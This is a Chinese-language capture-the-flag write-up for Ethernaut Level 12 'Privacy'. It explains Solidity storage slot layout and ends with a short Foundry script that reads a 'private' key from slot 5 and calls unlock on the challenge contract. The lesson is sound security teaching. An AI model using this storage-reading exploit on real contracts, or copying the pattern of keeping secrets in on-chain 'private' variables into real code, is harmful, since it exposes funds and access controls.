# Level 12 - Privacy

## 題目
[Privacy](https://ethernaut.openzeppelin.com/level/0x131c3249e115491E83De375171767Af07906eA36)

### 通關條件
這個合約的開發者非常小心的保護了 storage 敏感資料的區域.
把這個合約解鎖就可以通關喔

### 提示
- 理解 storage 是如何運作的
- 理解 parameter parsing 的原理
- 理解 casting 的原理
### 合約內容
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```
## 解題
**Storage** 在 [Level 8 - Vault](https://hackmd.io/@D13/ethernaut8) 就有提到，合約中的 state variable 皆會儲存於此

**Parameter parsing** 是指變數在被呼叫時的過程，會有兩種不同的稱呼：
  - Formal parameter（參數, Parameter）：宣告 function 時，設計用於接受值的變數
  - Actual parameter（引數, Argument）：呼叫 function 時，要輸入至參數的變數

parameter parsing 的說明也可以參考以下兩篇，有範例程式碼幫助了解：
- [The four parsing techniques in programming](https://medium.com/@joshaniekwe/do-you-know-that-there-are-four-parsing-technique-and-not-the-commonly-known-two-in-programming-64efed136b13)
- [引數 (Argument) vs. 參數 (Parameter)](https://notfalse.net/6/arg-vs-param#google_vignette)

**casting** 是指當不同型態的變數要一起運算時，「**若型態轉換不會影響原數值的話，就會自動改變型態並運算**」，舉裡來說：
```
uint8 valor1 = 140;
uint16 valor2 = 480;
uint16 valor3 = valor1 + valor2; // 620
```
詳細可以參考 [Learn Solidity lesson 22. Type casting.](https://medium.com/coinmonks/learn-solidity-lesson-22-type-casting-656d164b9991)


---

這題解鎖的方法要呼叫 16 行的 `unlock(bytes16 _key)`，它會檢查你輸入的 `_key ` 是否等於 `bytes16(data[2])`
```solidity=16
    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
```
所以我們要讀取 `data[2]` 的數值，雖然是 `private` 屬性，但我們還是可以在 storage slot 中找到，只要透過變數的長度去推算即可，這題宣告的變數有：
```solidity=5
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;
```
將變數逐個填入 stroage slot（1 個 slot 可以存放 32 bytes）：


| slot idx	 | (type) Variable |
| -------- | -------- | 
| 0     | (bool) locked | 
| 1     | (uint256) ID | 
| 2     | (uint8) flattening, (uint8) denomination, (uint16) awkwardness     | 
| 3     | (bytes32) data[0]| 
| 4     | (bytes32) data[1]| 
| 5     | (bytes32) data[2]| 

所以 `_key` 在 slot 5 可以找到，還要記得把它轉換成 `bytes16`，實作如下：
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/12_Privacy.sol";

contract ExploitScript is Script {
    Privacy level12 = Privacy(your_challenge_address);

    function run() external {
        vm.startBroadcast();

        level12.unlock(bytes16(vm.load(address(level12), bytes32(uint256(5)))));

        vm.stopBroadcast();
    }
}
```